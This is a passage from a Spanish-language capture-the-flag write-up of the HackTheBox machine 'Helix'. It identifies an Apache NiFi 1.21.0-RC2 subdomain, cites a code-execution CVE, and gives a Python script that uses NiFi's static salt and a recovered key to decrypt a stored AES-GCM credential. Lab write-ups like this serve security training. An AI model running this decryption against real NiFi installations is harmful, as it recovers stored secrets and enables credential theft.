Visitamos el subdominio y nos encontramos con la versión **nifi-1.21.0-RC2**.

![Subdomain Apache Nifi](@images/writeups/hackthebox/machines/helix/helix-subdomain-nifi.png)

Esta versión es vulnerable a una ejecución de código ([https://nvd.nist.gov/vuln/detail/cve-2023-34468](https://nvd.nist.gov/vuln/detail/cve-2023-34468)).

```python
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

password = b"TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl"
salt = b"NiFi Static Salt"
iterations = 160000

key = hashlib.pbkdf2_hmac('sha512', password, salt, iterations, 32)

cipher_hex = "1d6e24aee414340e5f6bd593f1eee0e6e700626ab8d7570597713a05461868413224bd371f4a987aa46d4e6ff814074f67d9"
binary_data = bytes.fromhex(cipher_hex)

iv = binary_data[:16]
ciphertext_with_tag = binary_data[16:]
ciphertext = ciphertext_with_tag[:-16]
tag = ciphertext_with_tag[-16:]

try:
    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
    decryptor = cipher.decryptor()
    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
    print(f"Decrypted credential: {plaintext.decode('utf-8')}")
except Exception as e:
    print(f"Error: {e}")
```
